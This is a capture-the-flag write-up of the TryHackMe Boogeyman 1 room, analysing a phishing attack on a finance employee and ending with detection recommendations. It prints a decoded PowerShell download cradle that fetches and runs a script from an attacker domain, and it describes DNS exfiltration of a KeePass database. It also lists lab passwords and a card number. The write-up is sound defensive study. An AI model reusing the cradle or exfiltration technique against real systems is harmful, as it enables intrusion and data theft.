@@ -1,0 +1,112 @@
+# Room Name - TryHackMe: Boogeyman 1
+
+Date: 07 October 2026
+Difficulty: Medium
+Category: SOC Level 1, phishing analysis, endpoint and network forensics
+
+# Scenario
+
+Julianne, a finance employee at Quick Logistics LLC, received a follow-up email about an unpaid invoice that appeared to come from a business partner, B Packaging Inc. The attached document was malicious and compromised her workstation. Other finance employees reported similar phishing emails, suggesting a targeted campaign against the finance team. The initial TTP was attributed to a new threat group named Boogeyman, known for targeting the logistics sector. The task was to analyse the phishing email, PowerShell logs and packet capture to assess the full impact of the compromise.
+
+# Tools Used
+
+- Thunderbird for viewing the phishing email and saving the attachment
+- grep, cat and base64 for manual header and payload analysis
+- unzip for extracting the password-protected attachment
+- LNKParse3 for analysing the malicious shortcut file
+- jq for parsing the JSON-formatted PowerShell logs
+- Wireshark and Tshark for packet capture analysis
+- xxd for rebuilding the exfiltrated file from hex
+- KeePass compatible viewer for opening the recovered database
+
+# What I Did
+
+Started with the phishing email and reviewed the sender, recipient and mail relay headers.
+
+```bash
+cat dump.eml | grep -iE "^from:|^to:|dkim-signature|list-unsubscribe"
+```
+
+The sender domain was bpakcaging.xyz, a typosquat of the legitimate partner name, and both the DKIM-Signature and List-Unsubscribe headers pointed to Elastic Email as the relay. I opened the email in Thunderbird, saved the encrypted zip attachment and extracted it using the password provided in the email body.
+
+```bash
+unzip Invoice.zip
+# password: Invoice2023!
+```
+
+The archive contained a shortcut file, which I analysed with lnkparse to pull the command line arguments.
+
+```bash
+lnkparse Invoice_20230103.lnk
+```
+
+The arguments held a base64 encoded PowerShell payload, which I decoded.
+
+```bash
+echo "aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==" | base64 -d
+```
+
+```powershell
+iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
+```
+
+Next I moved to the PowerShell logs and sorted the script block entries by timestamp to rebuild the attacker's activity in order.
+
+```bash
+cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[] | {ScriptBlockText}' | grep -v null
+```
+
+This showed the download of the Seatbelt enumeration tool, the use of sq3.exe to read the Microsoft Sticky Notes database, and the hex encoding of a KeePass database that was then sent out through nslookup queries.
+
+Finally I analysed the packet capture. The file hosting server responded with a Python HTTP server banner, and command outputs were sent back to the C2 using HTTP POST requests.
+
+```bash
+tshark -r capture.pcapng -Y "http.request.method == POST" -T fields -e http.host -e http.request.uri
+```
+
+I followed the POST stream tied to the sq3.exe command and decoded the output, which revealed the KeePass master password stored in Sticky Notes. To recover the exfiltrated file, I extracted the hex chunks from the DNS queries and rebuilt the database.
+
+```bash
+tshark -r capture.pcapng -Y "dns.qry.name contains bpakcaging.xyz and dns.flags.response == 0" -T fields -e dns.qry.name | grep -v cdn | cut -d '.' -f1 | uniq | tr -d '\n' | xxd -r -p > protected_data.kdbx
+```
+
+Opening the recovered database with the recovered password exposed a stored credit card number.
+
+# What I Found
+
+- Phishing sender: agriffin@bpakcaging.xyz
+- Victim: julianne.westcott@hotmail.com
+- Third-party mail relay: Elastic Email
+- Attachment contents: Invoice_20230103.lnk inside a password-protected zip
+- Attachment password: Invoice2023!
+- Initial payload: base64 encoded PowerShell using IEX and Net.WebClient to download a script from files.bpakcaging.xyz
+- Attacker domains: cdn.bpakcaging.xyz for C2 and files.bpakcaging.xyz for file hosting
+- Enumeration tool downloaded: Seatbelt
+- File accessed with sq3.exe: C:\Users\j.westcott\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
+- Software using that file: Microsoft Sticky Notes
+- Exfiltrated file: protected_data.kdbx, a KeePass password database
+- Exfiltration method: hex encoding sent through nslookup over DNS
+- File hosting server software: Python
+- C2 output method: HTTP POST
+- KeePass database password: %p9^3!lL^Mz47E2GaT^y
+- Credit card number stored inside: 4024007128269551
+
+# Key Learning
+
+- Typosquatted domains like bpakcaging.xyz are easy to miss when the display name looks familiar, so the sender domain should always be checked character by character
+- Password-protected archives are used to bypass email gateway scanning, and the password in the email body is a strong red flag
+- LNK files can carry encoded PowerShell in their arguments, and lnkparse quickly exposes it
+- Sorting PowerShell script block logs by timestamp with jq turns raw logs into a clear attack timeline
+- Users storing passwords in Sticky Notes gave the attacker everything needed to open the stolen KeePass database
+- DNS exfiltration using hex encoded subdomains can blend into normal traffic and is often missed without DNS monitoring
+
+# What I Would Flag in a Real SOC
+
+- Inbound emails from lookalike domains of known business partners, especially with encrypted attachments and passwords in the body
+- LNK files executed from email attachments or temp folders that spawn PowerShell
+- PowerShell launched with encoded commands, IEX or Net.WebClient download cradles
+- Outbound HTTP traffic to newly registered or unknown domains such as bpakcaging.xyz, particularly repeated POST requests on non-standard ports
+- Download and execution of known offensive tools like Seatbelt and unknown binaries like sq3.exe in user profile directories
+- Access to sensitive application data such as Sticky Notes plum.sqlite or KeePass .kdbx files by unexpected processes
+- High volumes of nslookup activity or long, hex-like subdomain queries to a single external domain, indicating DNS exfiltration
+- Recommended response: isolate the workstation, block the attacker domains and IPs, reset all credentials stored in the KeePass database, notify the card issuer about the exposed card, and hunt for the same phishing email across the finance team
